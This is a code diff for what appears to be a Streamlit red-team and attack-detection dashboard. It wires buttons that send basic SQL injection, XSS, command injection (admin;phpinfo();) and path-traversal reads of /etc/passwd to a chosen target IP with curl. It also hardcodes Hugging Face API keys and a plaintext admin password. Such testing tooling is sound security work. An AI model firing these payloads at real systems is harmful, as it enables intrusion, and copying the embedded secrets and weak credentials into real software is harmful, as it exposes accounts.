@@ -9,7 +9,7 @@ from mediator import AIModel
 from log_manager import log_attack, ATTACK_LOG_FILE, DETECTION_LOG_FILE
 import time
 
-ai = AIModel(api_key="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", model_name="mistralai/Mixtral-8x7B-Instruct-v0.1")
+ai = AIModel(api_key="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", model_name="mistralai/Mixtral-8x7B-Instruct-v0.1")
 
 USER_CREDENTIALS = {
     "admin": {"password": "adminpass", "role": "admin"},
@@ -72,27 +72,27 @@ else:
 
             if st.button("Basic SQL Injection"):
                 red_team_payload = f'curl -i "http://{target_ip}/index.html?user=admin%27%20OR%201%3D1--"'
-                result = run_payload(red_team_payload, "SQLi")
+                result = run_payload(red_team_payload, "SQLi", target_ip)
                 st.text_area("Red Team Log", result, height=200)
 
             if st.button("Basic XSS"):
                 red_team_payload = f'curl -i "http://{target_ip}/index.html?q=<script>alert(\'XSS\')</script>"'
-                result = run_payload(red_team_payload, "XSS")
+                result = run_payload(red_team_payload, "XSS", target_ip)
                 st.text_area("Red Team Log", result, height=200)
 
             if st.button("Command Injection"):
                 red_team_payload = f'curl -i -X POST "http://{target_ip}/login" -d "username=admin;phpinfo();" -A "curl"'
-                result = run_payload(red_team_payload, "CMDi")
+                result = run_payload(red_team_payload, "CMDi", target_ip)
                 st.text_area("Red Team Log", result, height=200)
 
             if st.button("Basic LFI"):
                 red_team_payload = f'curl -i "http://{target_ip}/index.html?page=../../../../etc/passwd"'
-                result = run_payload(red_team_payload, "LFI")
+                result = run_payload(red_team_payload, "LFI", target_ip)
                 st.text_area("Red Team Log", result, height=200)
 
             if st.button("False Positive - SQL Keyword"):
                 red_team_payload = f'curl -i "http://{target_ip}/index.html?contact=%22+SELECT+FROM+help"'
-                result = run_payload(red_team_payload, "False Positive")
+                result = run_payload(red_team_payload, "False Positive", target_ip)
                 st.text_area("Red Team Log", result, height=200)
 
     if "Custom Attack Logging" in tabs_content:
@@ -138,7 +138,7 @@ else:
                 wedges, _texts = ax.pie(
                     sizes,
                     labels=None,
-                    autopct=None,  # Disable percentage text
+                    autopct=None,
                     colors=colors,
                     startangle=120,
                     textprops={'color': 'black', 'fontsize': 7}
@@ -157,12 +157,12 @@ else:
 
                 ax.axis('equal')  # Force circle
 
-                # ✅ Save the figure to an in-memory buffer
+                # Save the figure to an in-memory buffer
                 buf = io.BytesIO()
                 fig.savefig(buf, format="png", bbox_inches="tight", transparent=True, dpi=600)
                 buf.seek(0)
 
-                # ✅ Use columns to center
+                # Use columns to center
                 col1, col2, col3 = st.columns([1,1,1])
 
                 with col2:
